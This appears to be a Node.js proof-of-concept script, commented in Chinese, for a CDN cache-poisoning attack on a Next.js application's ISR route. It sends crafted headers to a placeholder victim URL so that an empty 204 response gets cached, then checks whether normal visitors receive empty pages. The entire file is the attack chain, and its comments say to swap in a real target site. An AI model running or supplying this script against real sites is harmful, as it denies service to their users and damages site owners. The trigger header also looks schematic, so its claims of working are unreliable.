// 完整缓存投毒攻击模拟脚本 (Node.js 环境)
const fetch = require('node-fetch'); // 需先安装: npm install node-fetch

// 目标地址（替换为实际存在 ISR 路由的 Next.js 应用）
const targetUrl = "https://victim-site.com/api/data"; 
// 恶意请求头（触发漏洞的关键）
const poisonHeaders = {
    "X-Malicious-Header": "trigger-204", // 诱导服务器返回 204
    "Cache-Control": "public, max-age=3600" // 欺骗 CDN 缓存空响应
};

// 步骤1: 发送恶意请求污染缓存
const poisonCache = async () => {
    try {
        const response = await fetch(targetUrl, { headers: poisonHeaders });
        console.log(`[!] 攻击请求状态码: ${response.status}`);
        
        if (response.status === 204) {
            console.log("[+] 成功触发 204 响应，CDN 缓存已被污染");
            return true;
        } else {
            console.log("[-] 未触发 204，目标可能已修复漏洞或配置不符");
            return false;
        }
    } catch (err) {
        console.error(`[!] 攻击请求失败: ${err.message}`);
        return false;
    }
};

// 步骤2: 模拟正常用户访问验证攻击效果
const verifyAttack = async () => {
    try {
        const response = await fetch(targetUrl, { headers: {} }); // 无恶意头的正常请求
        const data = await response.text();
        
        if (data === "") {
            console.log(`[+] 攻击成功！用户收到空响应 (状态码: ${response.status})`);
        } else {
            console.log(`[-] 攻击失败，用户收到正常数据 (长度: ${data.length} 字节)`);
        }
    } catch (err) {
        console.error(`[!] 验证请求失败: ${err.message}`);
    }
};

// 执行完整攻击链
(async () => {
    console.log("[*] 开始缓存投毒攻击模拟...");
    const isPoisoned = await poisonCache();
    
    if (isPoisoned) {
        // 等待 CDN 缓存生效（根据实际网络调整延迟）
        await new Promise(resolve => setTimeout(resolve, 2000)); 
        console.log("[*] 验证攻击效果...");
        await verifyAttack();
    }
})();